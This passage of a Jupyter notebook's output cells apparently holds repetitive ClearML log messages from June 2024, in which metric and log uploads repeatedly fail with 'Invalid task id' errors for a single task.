      "2024-06-14 03:16:08,629 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:16:37,266 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:16:39,275 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:17:07,747 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:17:10,093 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:17:37,420 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:17:37,424 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n",
      "2024-06-14 03:17:38,566 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:17:39,827 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n",
      "2024-06-14 03:17:42,727 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:18:09,588 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:18:11,500 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:18:35,181 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:18:36,462 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:19:05,553 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:19:07,189 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:19:35,893 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=2)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:19:38,248 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:19:39,188 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:19:39,192 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:19:40,788 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:19:41,267 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=7)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:19:43,349 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:20:06,718 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:20:08,469 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:20:37,473 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:20:38,992 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:21:08,149 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:21:09,593 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:21:38,541 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n",
      "2024-06-14 03:21:39,909 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:21:39,912 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:21:40,000 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n",
      "2024-06-14 03:21:42,553 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:22:09,269 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:22:11,393 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:22:39,669 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:22:41,908 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:23:10,983 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:23:12,633 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:23:40,822 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:23:40,825 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n",
      "2024-06-14 03:23:41,629 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:23:43,542 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:24:12,349 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:24:14,212 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:24:43,331 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:24:44,701 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:25:09,629 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=3)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:25:10,994 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:25:15,229 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=6)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:25:17,630 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:25:40,829 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n",
      "2024-06-14 03:25:41,714 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:25:41,717 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:25:41,907 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n",
      "2024-06-14 03:25:44,501 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:26:11,709 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:26:13,048 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:26:42,665 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:26:43,785 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:27:13,149 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:27:14,369 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:27:43,194 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:27:43,195 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n",
      "2024-06-14 03:27:43,634 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:27:44,827 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:28:14,114 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:28:15,391 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:28:44,997 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:28:45,761 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:29:15,750 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:29:16,606 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:29:44,823 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:29:44,827 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n",
      "2024-06-14 03:29:46,225 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:29:47,185 - clearml.log - WARNING - failed logging task to backend (2 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=2)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:30:16,935 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:30:17,782 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:30:43,315 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=4)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:30:44,784 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:30:48,941 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=5)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:30:51,255 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:31:14,458 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:31:16,302 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:31:45,416 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n",
      "2024-06-14 03:31:45,939 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:31:45,943 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:31:46,956 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:32:16,507 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:32:17,316 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:32:46,865 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:32:47,825 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:33:17,242 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:33:18,865 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:33:47,186 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:33:47,190 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n",
      "2024-06-14 03:33:47,986 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:33:49,426 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:34:18,297 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:34:20,146 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:34:48,823 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:34:51,186 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:35:19,086 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:35:19,696 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:35:49,196 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:35:49,199 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n",
      "2024-06-14 03:35:49,422 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:35:50,122 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:36:16,208 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=5)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:36:18,857 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:36:22,032 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=4)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:36:23,155 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:36:47,864 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:36:49,437 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:37:18,539 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:37:19,980 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
